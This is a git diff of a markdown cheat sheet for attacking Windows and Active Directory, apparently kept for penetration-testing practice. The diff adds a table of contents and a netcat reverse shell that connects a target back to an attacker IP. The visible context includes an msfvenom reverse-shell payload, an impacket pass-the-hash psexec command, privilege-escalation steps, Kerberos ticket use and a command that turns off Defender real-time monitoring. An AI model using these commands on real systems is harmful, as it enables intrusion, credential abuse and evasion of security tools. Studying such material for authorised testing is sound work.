@@ -1,14 +1,19 @@
 # Windows-AD-attacking
 
 &nbsp;
+
+* [Reverse shells](#Reverse-shells)
+* [Transfer files](#Transfer-files)
+* [Privilege escalation](#Privilege-escalation)
+* [Kerberos / tickets](#Kerberos-/-tickets)
+* [Pass the hash](#Pass-the-hash)
+* [Enumeration / recon](#Enumeration-/-recon)
+* [Bypass security / AV evasion](#Bypass-security-/-AV-evasion)
+* [Misc commands](#Misc-commands)
+
 &nbsp;
 
-Anything about **Windows / Active Directory** will be posted here :D
-
-&nbsp;
-&nbsp;
-
-## < Generate shells >
+## Reverse shells
 
 &nbsp;
 &nbsp;
@@ -27,9 +32,24 @@ msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > 
 ```
 
 &nbsp;
+
+**[+] Reverse shell using NetCat**
+
+```powershell
+- In your Kali Linux machine:
+
+nc -lnvp 443
+
+- In the target's machine
+
+nc.exe 192.168.13.37 443 -e cmd.exe
+```
+
+
+&nbsp;
 &nbsp;
 
-## < Transfer files >
+## Transfer files
 
 &nbsp;
 &nbsp;
@@ -69,7 +89,7 @@ Note: You can access the share \\tsclient directly too
 &nbsp;
 &nbsp;
 
-## < Privilege escalation >
+## Privilege escalation
 
 &nbsp;
 &nbsp;
@@ -135,7 +155,7 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 &nbsp;
 &nbsp;
 
-## < Kerberos / tickets >
+## Kerberos / tickets
 
 &nbsp;
 &nbsp;
@@ -180,7 +200,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 &nbsp;
 &nbsp;
 
-## < Pass the hash / PTH >
+## Pass the hash
 
 &nbsp;
 &nbsp;
@@ -211,7 +231,7 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 &nbsp;
 &nbsp;
 
-## < Enumeration >
+## Enumeration / recon
 
 &nbsp;
 &nbsp;
@@ -249,7 +269,7 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 &nbsp;
 &nbsp;
 
-## < Bypass security / AV evasion >
+## Bypass security / AV evasion
 
 &nbsp;
 &nbsp;
@@ -284,7 +304,7 @@ powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 &nbsp;
 &nbsp;
 
-## < Misc commands >
+## Misc commands
 
 &nbsp;
 &nbsp;
